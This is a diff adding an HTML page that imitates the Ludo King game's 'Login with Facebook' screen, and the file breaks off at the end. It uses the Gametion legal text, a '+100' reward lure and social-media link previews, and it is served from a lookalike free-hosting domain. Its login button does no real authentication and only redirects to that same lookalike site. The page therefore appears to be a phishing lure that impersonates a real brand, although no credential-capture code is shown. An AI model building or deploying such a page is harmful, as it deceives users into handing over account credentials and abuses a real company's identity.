@@ -1,0 +1,965 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<!-- ============================================================
+     🔗 INVITE LINK PREVIEW (Open Graph)
+     ============================================================ -->
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Ludo King" />
+<meta property="og:description" content="Online ludo with Facebook friend & enjoy voice chat" />
+<meta property="og:image" content="https://i.postimg.cc/hjnW70ZS/ludo-dance-season-1200x630-500kb.jpg" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:image:type" content="image/jpeg" />
+<meta property="og:url" content="https://ludo-kings.infinityfree.io/" />
+<meta property="og:site_name" content="Ludo King" />
+
+<!-- Twitter Card -->
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Ludo King" />
+<meta name="twitter:description" content="Online ludo with Facebook friend & enjoy voice chat" />
+<meta name="twitter:image" content="https://i.postimg.cc/hjnW70ZS/ludo-dance-season-1200x630-500kb.jpg" />
+
+<title>Ludo King — Premium Login</title>
+<style>
+/* ============================================================
+   RESET & BASE
+   ============================================================ */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  -webkit-tap-highlight-color: transparent;
+}
+
+html, body {
+  width: 100%;
+  height: 100%;
+  overflow: hidden;
+  font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, sans-serif;
+  background: #0a0a0a;
+  color: #fff;
+  user-select: none;
+}
+
+/* ============================================================
+   BACKGROUND LAYERS
+   ============================================================ */
+.bg-layer {
+  position: fixed;
+  inset: 0;
+  pointer-events: none;
+  z-index: 0;
+}
+
+.bg-board {
+  background:
+    radial-gradient(ellipse at 30% 20%, rgba(230, 57, 70, 0.25) 0%, transparent 50%),
+    radial-gradient(ellipse at 70% 30%, rgba(42, 157, 143, 0.2) 0%, transparent 50%),
+    radial-gradient(ellipse at 50% 80%, rgba(69, 123, 157, 0.2) 0%, transparent 50%),
+    radial-gradient(ellipse at 20% 70%, rgba(233, 196, 106, 0.15) 0%, transparent 50%),
+    #0a0a0a;
+}
+
+.bg-glow {
+  background:
+    radial-gradient(circle at 50% 25%, rgba(247, 183, 51, 0.12) 0%, transparent 60%),
+    radial-gradient(circle at 50% 90%, rgba(69, 123, 157, 0.15) 0%, transparent 50%);
+  animation: glowPulse 6s ease-in-out infinite alternate;
+}
+
+@keyframes glowPulse {
+  0% { opacity: 0.7; }
+  100% { opacity: 1; }
+}
+
+/* Particles */
+.particles {
+  position: fixed;
+  inset: 0;
+  pointer-events: none;
+  z-index: 1;
+  overflow: hidden;
+}
+
+.particle {
+  position: absolute;
+  border-radius: 50%;
+  opacity: 0;
+  animation: floatUp linear infinite;
+  box-shadow: 0 0 12px 4px rgba(249, 212, 35, 0.4);
+}
+
+@keyframes floatUp {
+  0% { transform: translateY(0) scale(0.5); opacity: 0; }
+  20% { opacity: 0.8; }
+  80% { opacity: 0.6; }
+  100% { transform: translateY(-110vh) scale(1.2); opacity: 0; }
+}
+
+/* ============================================================
+   STAGE / LAYOUT
+   ============================================================ */
+.stage {
+  position: relative;
+  z-index: 2;
+  width: 100%;
+  height: 100%;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: flex-end;
+  padding: 0 16px 16px;
+  gap: 8px;
+}
+
+/* ============================================================
+   LOGO AREA
+   ============================================================ */
+.logo-area {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+  width: 100%;
+  max-width: 500px;
+  padding-top: 20px;
+}
+
+/* Crown */
+.crown {
+  width: 100px;
+  height: 60px;
+  filter: drop-shadow(0 0 20px rgba(247, 183, 51, 0.6));
+  animation: crownFloat 4s ease-in-out infinite;
+  margin-bottom: -10px;
+  z-index: 3;
+}
+
+@keyframes crownFloat {
+  0%, 100% { transform: translateY(0); }
+  50% { transform: translateY(-6px); }
+}
+
+.crown-svg { width: 100%; height: 100%; }
+
+/* Title Ring */
+.title-ring {
+  position: relative;
+  width: 280px;
+  height: 120px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 2;
+}
+
+.ring-outer {
+  position: absolute;
+  inset: 0;
+  border-radius: 50%;
+  border: 4px solid transparent;
+  background: linear-gradient(135deg, #f9d423, #d4a017, #b8860b, #f9d423) border-box;
+  -webkit-mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0);
+  -webkit-mask-composite: xor;
+  mask-composite: exclude;
+  filter: drop-shadow(0 0 12px rgba(249, 212, 35, 0.5));
+}
+
+.ring-inner {
+  position: absolute;
+  inset: 8px;
+  border-radius: 50%;
+  background: radial-gradient(circle at 50% 40%, rgba(20, 20, 30, 0.95), rgba(5, 5, 10, 0.98));
+  border: 2px solid rgba(249, 212, 35, 0.3);
+  box-shadow: inset 0 0 30px rgba(0, 0, 0, 0.8);
+}
+
+.letters {
+  position: relative;
+  display: flex;
+  gap: 4px;
+  z-index: 1;
+}
+
+.letter {
+  font-size: 2.6rem;
+  font-weight: 900;
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  text-shadow: 0 2px 8px rgba(0, 0, 0, 0.8);
+  display: inline-block;
+  animation: letterShine 3s ease-in-out infinite alternate;
+}
+
+.letter-l { color: #4a9eff; text-shadow: 0 0 15px rgba(74, 158, 255, 0.8), 0 2px 4px rgba(0,0,0,0.8); }
+.letter-u { color: #ff4a4a; text-shadow: 0 0 15px rgba(255, 74, 74, 0.8), 0 2px 4px rgba(0,0,0,0.8); }
+.letter-d { color: #4aff4a; text-shadow: 0 0 15px rgba(74, 255, 74, 0.8), 0 2px 4px rgba(0,0,0,0.8); }
+.letter-o { color: #ffd700; text-shadow: 0 0 15px rgba(255, 215, 0, 0.8), 0 2px 4px rgba(0,0,0,0.8); }
+
+@keyframes letterShine {
+  0% { filter: brightness(1); }
+  100% { filter: brightness(1.3); }
+}
+
+/* King Badge */
+.king-badge {
+  position: relative;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  margin-top: -10px;
+  z-index: 2;
+}
+
+.king-text {
+  font-size: 1.8rem;
+  font-weight: 900;
+  letter-spacing: 6px;
+  background: linear-gradient(180deg, #fff8d6 0%, #f9d423 40%, #d4a017 100%);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  text-shadow: 0 0 30px rgba(249, 212, 35, 0.5);
+  filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.8));
+}
+
+.king-laurel {
+  width: 30px;
+  height: 40px;
+  background: linear-gradient(180deg, #f9d423, #b8860b);
+  clip-path: polygon(0 0, 100% 20%, 80% 50%, 100% 80%, 0 100%, 20% 50%);
+  opacity: 0.8;
+  filter: drop-shadow(0 0 6px rgba(249, 212, 35, 0.4));
+}
+
+.king-laurel.left { transform: scaleX(-1); }
+
+/* Board Area */
+.board-area {
+  position: relative;
+  width: 220px;
+  height: 160px;
+  margin-top: 4px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1;
+}
+
+.board-glow {
+  position: absolute;
+  inset: -20px;
+  background: radial-gradient(ellipse at center, rgba(249, 212, 35, 0.15) 0%, transparent 70%);
+  border-radius: 50%;
+  animation: glowPulse 3s ease-in-out infinite alternate;
+}
+
+.board {
+  width: 140px;
+  height: 140px;
+  border-radius: 12px;
+  background: linear-gradient(135deg, #1a1a2e, #16213e);
+  border: 3px solid #d4a017;
+  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.8), inset 0 0 20px rgba(0, 0, 0, 0.5);
+  overflow: hidden;
+  position: relative;
+  transform: perspective(400px) rotateX(15deg) rotateZ(-5deg);
+}
+
+.board-grid {
+  display: grid;
+  grid-template-columns: repeat(6, 1fr);
+  grid-template-rows: repeat(6, 1fr);
+  width: 100%;
+  height: 100%;
+  gap: 1px;
+  padding: 4px;
+  background: rgba(0, 0, 0, 0.3);
+}
+
+.cell { border-radius: 2px; opacity: 0.9; }
+.cell.blue { background: #4a9eff; box-shadow: 0 0 6px rgba(74, 158, 255, 0.6); }
+.cell.red { background: #ff4a4a; box-shadow: 0 0 6px rgba(255, 74, 74, 0.6); }
+.cell.green { background: #4aff4a; box-shadow: 0 0 6px rgba(74, 255, 74, 0.6); }
+.cell.yellow { background: #ffd700; box-shadow: 0 0 6px rgba(255, 215, 0, 0.6); }
+.cell.white { background: rgba(255, 255, 255, 0.9); }
+
+/* Pieces */
+.piece {
+  position: absolute;
+  width: 18px;
+  height: 22px;
+  border-radius: 50% 50% 30% 30%;
+  z-index: 5;
+  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.6), inset 0 -4px 6px rgba(0, 0, 0, 0.3);
+  animation: pieceBounce 2s ease-in-out infinite;
+}
+
+.piece::after {
+  content: '';
+  position: absolute;
+  top: 3px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, 0.5);
+}
+
+.piece-blue { background: linear-gradient(135deg, #6bb5ff, #2a6db5); bottom: 15px; left: 20px; animation-delay: 0s; }
+.piece-red { background: linear-gradient(135deg, #ff6b6b, #b52a2a); bottom: 25px; left: 50px; animation-delay: 0.3s; }
+.piece-green { background: linear-gradient(135deg, #6bff6b, #2ab52a); bottom: 20px; right: 45px; animation-delay: 0.6s; }
+.piece-yellow { background: linear-gradient(135deg, #ffe66b, #b5a02a); bottom: 12px; right: 18px; animation-delay: 0.9s; }
+
+@keyframes pieceBounce {
+  0%, 100% { transform: translateY(0); }
+  50% { transform: translateY(-4px); }
+}
+
+/* Dice */
+.dice {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%) rotate(15deg);
+  width: 36px;
+  height: 36px;
+  background: linear-gradient(135deg, #ffffff, #d0d0d0);
+  border-radius: 8px;
+  box-shadow: 0 6px 16px rgba(0, 0, 0, 0.7), inset 0 2px 4px rgba(255, 255, 255, 0.8);
+  z-index: 10;
+  animation: diceSpin 6s ease-in-out infinite;
+}
+
+@keyframes diceSpin {
+  0%, 100% { transform: translate(-50%, -50%) rotate(15deg); }
+  25% { transform: translate(-50%, -50%) rotate(25deg); }
+  75% { transform: translate(-50%, -50%) rotate(5deg); }
+}
+
+.dice-face {
+  width: 100%;
+  height: 100%;
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  grid-template-rows: repeat(3, 1fr);
+  padding: 6px;
+  gap: 2px;
+  place-items: center;
+}
+
+.dot {
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  background: #1a1a2e;
+  box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.5);
+}
+
+.dice-face .dot:nth-child(1) { grid-area: 1 / 1; }
+.dice-face .dot:nth-child(2) { grid-area: 1 / 3; }
+.dice-face .dot:nth-child(3) { grid-area: 2 / 1; }
+.dice-face .dot:nth-child(4) { grid-area: 2 / 3; }
+.dice-face .dot:nth-child(5) { grid-area: 3 / 1; }
+.dice-face .dot:nth-child(6) { grid-area: 3 / 3; }
+
+/* ============================================================
+   PANEL — Login box
+   ============================================================ */
+.panel {
+  width: 100%;
+  max-width: 440px;
+  background: rgba(10, 10, 18, 0.75);
+  backdrop-filter: blur(20px);
+  -webkit-backdrop-filter: blur(20px);
+  border: 1.5px solid rgba(249, 212, 35, 0.35);
+  border-radius: 20px;
+  padding: 16px 14px 14px;
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+  box-shadow:
+    0 8px 40px rgba(0, 0, 0, 0.7),
+    0 0 60px rgba(249, 212, 35, 0.08),
+    inset 0 1px 0 rgba(255, 255, 255, 0.08);
+  position: relative;
+  z-index: 10;
+  animation: panelEnter 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+  opacity: 0;
+  transform: translateY(30px);
+  margin-bottom: 12vh;
+}
+
+@keyframes panelEnter {
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.panel-row { display: flex; gap: 8px; width: 100%; }
+.top-row .btn { flex: 1; }
+
+/* Buttons Base */
+.btn {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+  border: none;
+  border-radius: 12px;
+  cursor: pointer;
+  font-weight: 600;
+  font-size: 0.78rem;
+  padding: 12px 8px;
+  transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+  position: relative;
+  overflow: hidden;
+  letter-spacing: 0.3px;
+  min-height: 48px;
+  touch-action: manipulation;
+}
+
+.btn::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: -100%;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.15), transparent);
+  transition: left 0.5s ease;
+}
+
+.btn:hover::before { left: 100%; }
+.btn:active { transform: scale(0.97); }
+
+.btn-glass {
+  background: linear-gradient(135deg, rgba(30, 40, 70, 0.9), rgba(15, 20, 40, 0.9));
+  border: 1.5px solid rgba(74, 158, 255, 0.35);
+  color: #e0e8ff;
+  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.08);
+}
+
+.btn-glass:hover {
+  border-color: rgba(74, 158, 255, 0.7);
+  box-shadow: 0 4px 24px rgba(74, 158, 255, 0.2), inset 0 1px 0 rgba(255, 255, 255, 0.12);
+  background: linear-gradient(135deg, rgba(40, 55, 95, 0.95), rgba(20, 28, 55, 0.95));
+}
+
+.btn-icon { font-size: 1rem; line-height: 1; }
+.btn-label { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+.btn-reward {
+  border-color: rgba(249, 212, 35, 0.4);
+  color: #ffe066;
+}
+
+.btn-reward:hover {
+  border-color: rgba(249, 212, 35, 0.8);
+  box-shadow: 0 4px 24px rgba(249, 212, 35, 0.25), inset 0 1px 0 rgba(255, 255, 255, 0.12);
+}
+
+/* Login Button */
+.btn-login {
+  width: 100%;
+  background: linear-gradient(180deg, #4a9eff 0%, #1877f2 50%, #0d5bbd 100%);
+  border: 1.5px solid rgba(255, 255, 255, 0.2);
+  color: #fff;
+  font-size: 1rem;
+  font-weight: 700;
+  padding: 16px 20px;
+  min-height: 56px;
+  border-radius: 14px;
+  box-shadow:
+    0 6px 24px rgba(24, 119, 242, 0.45),
+    0 2px 8px rgba(0, 0, 0, 0.4),
+    inset 0 1px 0 rgba(255, 255, 255, 0.25);
+  letter-spacing: 0.5px;
+}
+
+.btn-login:hover {
+  box-shadow:
+    0 8px 32px rgba(24, 119, 242, 0.6),
+    0 2px 8px rgba(0, 0, 0, 0.4),
+    inset 0 1px 0 rgba(255, 255, 255, 0.3);
+  background: linear-gradient(180deg, #5aabff 0%, #2887ff 50%, #1a6ad4 100%);
+}
+
+.btn-login:active { transform: scale(0.98); }
+
+.fb-icon {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 28px;
+  height: 28px;
+  background: rgba(255, 255, 255, 0.2);
+  border-radius: 50%;
+  flex-shrink: 0;
+}
+
+/* Legal Text */
+.legal {
+  font-size: 0.65rem;
+  line-height: 1.5;
+  color: rgba(200, 210, 230, 0.7);
+  text-align: center;
+  padding: 0 4px;
+}
+
+.privacy-link {
+  color: #4a9eff;
+  text-decoration: none;
+  font-weight: 600;
+  transition: color 0.2s;
+}
+
+.privacy-link:hover { color: #7abfff; text-decoration: underline; }
+
+/* ============================================================
+   WELCOME POPUP
+   ============================================================ */
+.welcome-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.7);
+  backdrop-filter: blur(8px);
+  -webkit-backdrop-filter: blur(8px);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 999;
+  padding: 20px;
+  opacity: 0;
+  visibility: hidden;
+  transition: opacity 0.4s ease, visibility 0.4s ease;
+}
+
+.welcome-overlay.active {
+  opacity: 1;
+  visibility: visible;
+}
+
+.welcome-box {
+  width: 100%;
+  max-width: 340px;
+  background: linear-gradient(160deg, rgba(25, 30, 50, 0.98), rgba(10, 12, 25, 0.98));
+  border: 2px solid rgba(249, 212, 35, 0.6);
+  border-radius: 22px;
+  padding: 32px 24px 24px;
+  text-align: center;
+  box-shadow:
+    0 20px 60px rgba(0, 0, 0, 0.9),
+    0 0 80px rgba(249, 212, 35, 0.25),
+    inset 0 1px 0 rgba(255, 255, 255, 0.1);
+  transform: scale(0.85) translateY(20px);
+  transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+  position: relative;
+}
+
+.welcome-overlay.active .welcome-box {
+  transform: scale(1) translateY(0);
+}
+
+.welcome-icon {
+  width: 70px;
+  height: 70px;
+  margin: 0 auto 16px;
+  border-radius: 50%;
+  background: linear-gradient(135deg, #f9d423, #d4a017);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 2rem;
+  box-shadow: 0 0 30px rgba(249, 212, 35, 0.6);
+  animation: iconPop 0.6s ease 0.2s both;
+}
+
+@keyframes iconPop {
+  0% { transform: scale(0); }
+  70% { transform: scale(1.15); }
+  100% { transform: scale(1); }
+}
+
+.welcome-title {
+  font-size: 1.5rem;
+  font-weight: 800;
+  margin-bottom: 8px;
+  background: linear-gradient(180deg, #fff8d6, #f9d423, #d4a017);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  letter-spacing: 0.5px;
+}
+
+.welcome-sub {
+  font-size: 0.85rem;
+  color: rgba(200, 210, 230, 0.8);
+  margin-bottom: 22px;
+  line-height: 1.5;
+}
+
+.welcome-btn {
+  width: 100%;
+  padding: 14px 24px;
+  border: none;
+  border-radius: 14px;
+  background: linear-gradient(180deg, #4a9eff 0%, #1877f2 50%, #0d5bbd 100%);
+  color: #fff;
+  font-size: 1rem;
+  font-weight: 700;
+  letter-spacing: 1px;
+  cursor: pointer;
+  box-shadow:
+    0 6px 24px rgba(24, 119, 242, 0.5),
+    inset 0 1px 0 rgba(255, 255, 255, 0.25);
+  transition: all 0.25s ease;
+  touch-action: manipulation;
+}
+
+.welcome-btn:hover {
+  box-shadow:
+    0 8px 32px rgba(24, 119, 242, 0.7),
+    inset 0 1px 0 rgba(255, 255, 255, 0.3);
+  transform: translateY(-2px);
+}
+
+.welcome-btn:active {
+  transform: scale(0.97) translateY(0);
+}
+
+/* ============================================================
+   RESPONSIVE
+   ============================================================ */
+@media (max-width: 400px) {
+  .stage { padding: 0 10px 10px; gap: 4px; }
+  .crown { width: 80px; height: 48px; }
+  .title-ring { width: 230px; height: 100px; }
+  .letter { font-size: 2rem; }
+  .king-text { font-size: 1.4rem; letter-spacing: 4px; }
+  .king-laurel { width: 22px; height: 30px; }
+  .board-area { width: 180px; height: 130px; }
+  .board { width: 110px; height: 110px; }
+  .piece { width: 14px; height: 18px; }
+  .dice { width: 30px; height: 30px; }
+  .dot { width: 5px; height: 5px; }
+  .panel { padding: 12px 10px 10px; gap: 10px; border-radius: 16px; margin-bottom: 8vh; }
+  .btn { font-size: 0.7rem; padding: 10px 6px; min-height: 42px; border-radius: 10px; }
+  .btn-login { font-size: 0.88rem; padding: 14px 16px; min-height: 50px; }
+  .fb-icon { width: 24px; height: 24px; }
+  .fb-icon svg { width: 20px; height: 20px; }
+  .legal { font-size: 0.58rem; }
+  .welcome-title { font-size: 1.25rem; }
+  .welcome-icon { width: 58px; height: 58px; font-size: 1.6rem; }
+}
+
+@media (min-width: 768px) {
+  .crown { width: 130px; height: 78px; }
+  .title-ring { width: 340px; height: 145px; }
+  .letter { font-size: 3.2rem; }
+  .king-text { font-size: 2.2rem; letter-spacing: 8px; }
+  .king-laurel { width: 38px; height: 50px; }
+  .board-area { width: 280px; height: 200px; }
+  .board { width: 180px; height: 180px; }
+  .piece { width: 22px; height: 28px; }
+  .dice { width: 44px; height: 44px; }
+  .dot { width: 8px; height: 8px; }
+  .panel { max-width: 480px; padding: 20px 18px 18px; gap: 14px; margin-bottom: 10vh; }
+  .btn { font-size: 0.88rem; padding: 14px 12px; min-height: 52px; }
+  .btn-login { font-size: 1.1rem; padding: 18px 24px; min-height: 60px; }
+  .legal { font-size: 0.72rem; }
+  .welcome-title { font-size: 1.7rem; }
+}
+
+@media (min-width: 1024px) {
+  .stage { justify-content: center; gap: 20px; }
+  .logo-area { flex: 0 1 auto; padding-top: 0; }
+  .crown { width: 150px; height: 90px; }
+  .title-ring { width: 380px; height: 160px; }
+  .letter { font-size: 3.6rem; }
+  .king-text { font-size: 2.6rem; }
+  .board-area { width: 320px; height: 230px; }
+  .board { width: 200px; height: 200px; }
+  .panel { max-width: 520px; margin-bottom: 6vh; }
+}
+
+@media (min-width: 1440px) {
+  .crown { width: 170px; height: 100px; }
+  .title-ring { width: 420px; height: 180px; }
+  .letter { font-size: 4rem; }
+  .king-text { font-size: 3rem; }
+  .board-area { width: 360px; height: 260px; }
+  .board { width: 230px; height: 230px; }
+  .piece { width: 26px; height: 34px; }
+  .dice { width: 50px; height: 50px; }
+  .dot { width: 9px; height: 9px; }
+  .panel { margin-bottom: 5vh; }
+}
+
+/* Landscape mobile */
+@media (max-height: 600px) and (orientation: landscape) {
+  .stage {
+    flex-direction: row;
+    justify-content: center;
+    align-items: center;
+    padding: 10px 20px;
+    gap: 20px;
+  }
+  .logo-area { flex: 0 1 45%; padding-top: 0; }
+  .panel { flex: 0 1 45%; max-width: 400px; margin-bottom: 0; }
+  .crown { width: 70px; height: 42px; }
+  .title-ring { width: 180px; height: 80px; }
+  .letter { font-size: 1.6rem; }
+  .king-text { font-size: 1.2rem; letter-spacing: 3px; }
+  .king-laurel { width: 18px; height: 24px; }
+  .board-area { width: 140px; height: 100px; }
+  .board { width: 90px; height: 90px; }
+  .piece { width: 12px; height: 16px; }
+  .dice { width: 24px; height: 24px; }
+  .dot { width: 4px; height: 4px; }
+  .panel { padding: 10px 8px 8px; gap: 8px; border-radius: 14px; }
+  .btn { font-size: 0.65rem; padding: 8px 4px; min-height: 36px; border-radius: 8px; }
+  .btn-login { font-size: 0.8rem; padding: 10px 12px; min-height: 42px; }
+  .fb-icon { width: 20px; height: 20px; }
+  .fb-icon svg { width: 16px; height: 16px; }
+  .legal { font-size: 0.5rem; }
+  .btn-icon { font-size: 0.8rem; }
+}
+</style>
+</head>
+<body>
+
+<!-- Background Layers -->
+<div class="bg-layer bg-board"></div>
+<div class="bg-layer bg-glow"></div>
+<div class="particles" id="particles"></div>
+
+<!-- Main Content -->
+<main class="stage">
+  <!-- Logo / Hero Section -->
+  <div class="logo-area">
+    <div class="crown">
+      <svg viewBox="0 0 100 60" class="crown-svg">
+        <defs>
+          <linearGradient id="goldGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+            <stop offset="0%" style="stop-color:#f9d423"/>
+            <stop offset="50%" style="stop-color:#f7b733"/>
+            <stop offset="100%" style="stop-color:#d4a017"/>
+          </linearGradient>
+        </defs>
+        <path d="M10 50 L90 50 L85 35 L75 45 L65 25 L50 40 L35 25 L25 45 L15 35 Z" fill="url(#goldGrad)" stroke="#b8860b" stroke-width="1.5"/>
+        <circle cx="50" cy="18" r="5" fill="#e63946" stroke="#b8860b" stroke-width="1.5"/>
+        <circle cx="30" cy="30" r="3.5" fill="#457b9d" stroke="#b8860b" stroke-width="1.2"/>
+        <circle cx="70" cy="30" r="3.5" fill="#2a9d8f" stroke="#b8860b" stroke-width="1.2"/>
+      </svg>
+    </div>
+
+    <div class="title-ring">
+      <div class="ring-outer"></div>
+      <div class="ring-inner"></div>
+      <div class="letters">
+        <span class="letter letter-l">L</span>
+        <span class="letter letter-u">U</span>
+        <span class="letter letter-d">D</span>
+        <span class="letter letter-o">O</span>
+      </div>
+    </div>
+
+    <div class="king-badge">
+      <div class="king-laurel left"></div>
+      <span class="king-text">KING</span>
+      <div class="king-laurel right"></div>
+    </div>
+
+    <!-- Game Board & Pieces -->
+    <div class="board-area">
+      <div class="board-glow"></div>
+      <div class="board">
+        <div class="board-grid">
+          <div class="cell blue"></div><div class="cell blue"></div><div class="cell white"></div><div class="cell white"></div><div class="cell green"></div><div class="cell green"></div>
+          <div class="cell blue"></div><div class="cell blue"></div><div class="cell white"></div><div class="cell white"></div><div class="cell green"></div><div class="cell green"></div>
+          <div class="cell white"></div><div class="cell white"></div><div class="cell white"></div><div class="cell white"></div><div class="cell white"></div><div class="cell white"></div>
+          <div class="cell white"></div><div class="cell white"></div><div class="cell white"></div><div class="cell white"></div><div class="cell white"></div><div class="cell white"></div>
+          <div class="cell red"></div><div class="cell red"></div><div class="cell white"></div><div class="cell white"></div><div class="cell yellow"></div><div class="cell yellow"></div>
+          <div class="cell red"></div><div class="cell red"></div><div class="cell white"></div><div class="cell white"></div><div class="cell yellow"></div><div class="cell yellow"></div>
+        </div>
+      </div>
+      <div class="piece piece-blue"></div>
+      <div class="piece piece-red"></div>
+      <div class="piece piece-green"></div>
+      <div class="piece piece-yellow"></div>
+      <div class="dice">
+        <div class="dice-face">
+          <span class="dot"></span><span class="dot"></span><span class="dot"></span>
+          <span class="dot"></span><span class="dot"></span><span class="dot"></span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Action Panel -->
+  <div class="panel">
+    <div class="panel-row top-row">
+      <button class="btn btn-glass" id="saveDataBtn">
+        <span class="btn-icon">☁️</span>
+        <span class="btn-label">Save Data</span>
+      </button>
+      <button class="btn btn-glass" id="changeDeviceBtn">
+        <span class="btn-icon">📱</span>
+        <span class="btn-label">Change Device</span>
+      </button>
+      <button class="btn btn-glass btn-reward" id="rewardBtn">
+        <span class="btn-icon">💎</span>
+        <span class="btn-label">+100</span>
+      </button>
+    </div>
+
+    <button class="btn btn-login" id="loginBtn">
+      <span class="fb-icon">
+        <svg viewBox="0 0 24 24" width="24" height="24" fill="white">
+          <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+        </svg>
+      </span>
+      <span class="btn-label">Login with Facebook</span>
+    </button>
+
+    <p class="legal">
+      By continuing I agree that Gametion Technologies Pvt. Ltd. may store and process my data in accordance with the
+      <a href="#" class="privacy-link">Privacy Policy</a>
+    </p>
+  </div>
+</main>
+
+<!-- Welcome Popup -->
+<div class="welcome-overlay" id="welcomeOverlay">
+  <div class="welcome-box">
+    <div class="welcome-icon">🎉</div>
+    <h2 class="welcome-title">Welcome to Ludo King</h2>
+    <p class="welcome-sub">Get ready to play and enjoy the game!</p>
+    <button class="welcome-btn" id="welcomeOkBtn">OK</button>
+  </div>
+</div>
+
+<script>
+/* ============================================================
+   ✅ CONFIGURATION — Login ক্লিক করলে যেখানে যাবে
+   ============================================================ */
+const REDIRECT_URL = "https://ludo-kings.infinityfree.io/";
+
+/* ============================================================
+   ✅ WELCOME POPUP — ১ সেকেন্ড পর নিজে থেকে আসবে
+   ============================================================ */
+const welcomeOverlay = document.getElementById('welcomeOverlay');
+const welcomeOkBtn = document.getElementById('welcomeOkBtn');
+
+setTimeout(() => {
+  welcomeOverlay.classList.add('active');
+}, 800);
+
+if (welcomeOkBtn) {
+  welcomeOkBtn.addEventListener('click', () => {
+    welcomeOverlay.classList.remove('active');
+  });
+}
+
+/* ============================================================
+   ✅ PARTICLE SYSTEM
+   ============================================================ */
+(function initParticles() {
+  const container = document.getElementById('particles');
+  if (!container) return;
+
+  const PARTICLE_COUNT = 30;
+  const colors = [
+    'radial-gradient(circle, #f9d423, transparent)',
+    'radial-gradient(circle, #4a9eff, transparent)',
+    'radial-gradient(circle, #ff6b6b, transparent)',
+    'radial-gradient(circle, #4aff4a, transparent)',
+    'radial-gradient(circle, #ffd700, transparent)'
+  ];
+
+  for (let i = 0; i < PARTICLE_COUNT; i++) {
+    const particle = document.createElement('div');
+    particle.className = 'particle';
+    const size = Math.random() * 6 + 3;
+    const left = Math.random() * 100;
+    const delay = Math.random() * 10;
+    const duration = Math.random() * 8 + 6;
+    const color = colors[Math.floor(Math.random() * colors.length)];
+
+    particle.style.cssText = `
+      width: ${size}px;
+      height: ${size}px;
+      left: ${left}%;
+      bottom: -20px;
+      background: ${color};
+      animation-delay: ${delay}s;
+      animation-duration: ${duration}s;
+    `;
+
+    container.appendChild(particle);
+  }
+})();
+
+/* ============================================================
+   ✅ BUTTON HANDLERS
+   ============================================================ */
+
+// ✅ Login button — রিডাইরেক্ট to ludo-kings
+const loginBtn = document.getElementById('loginBtn');
+if (loginBtn) {
+  loginBtn.addEventListener('click', () => {
+    try { window.top.location.href = REDIRECT_URL; }
+    catch (err) {
+      try { window.parent.location.href = REDIRECT_URL; }
+      catch (e2) { window.location.href = REDIRECT_URL; }
+    }
+  });
+}
+
+// Decorative buttons
+const saveDataBtn = document.getElementById('saveDataBtn');
+if (saveDataBtn) {
+  saveDataBtn.addEventListener('click', () => {
+    saveDataBtn.style.transform = 'scale(0.95)';
+    setTimeout(() => { saveDataBtn.style.transform = ''; }, 150);
+  });
+}
+
+const changeDeviceBtn = document.getElementById('changeDeviceBtn');
+if (changeDeviceBtn) {
+  changeDeviceBtn.addEventListener('click', () => {
+    changeDeviceBtn.style.transform = 'scale(0.95)';
+    setTimeout(() => { changeDeviceBtn.style.transform = ''; }, 150);
+  });
+}
+
+const rewardBtn = document.getElementById('rewardBtn');
+if (rewardBtn) {
+  rewardBtn.addEventListener('click', () => {
+    rewardBtn.style.transform = 'scale(0.95)';
+    setTimeout(() => { rewardBtn.style.transform = ''; }, 150);
+  });
+}
+
+/* ============================================================
+   ✅ PREVENT DOUBLE-TAP ZOOM ON MOBILE
